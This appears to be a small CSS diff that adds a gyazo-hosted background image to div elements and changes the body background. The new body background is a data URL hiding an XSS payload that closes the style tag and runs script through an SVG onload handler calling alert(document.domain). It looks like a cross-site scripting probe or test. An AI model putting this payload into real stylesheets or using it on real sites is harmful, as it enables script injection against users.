@@ -1,5 +1,7 @@
+div  {
+    background-image: url("https://i.gyazo.com/4f984871ff7f9121d4368ed29a322ff3.png");
+}
 body {
-    background: url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' width='500' height='100'><text x='10' y='40' font-size='24' fill='red'>Hello, World!</text></svg>") no-repeat center top;
-    height: 200vh;
-    margin: 0;
+	background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
+	background-color: #FF0000;
 }
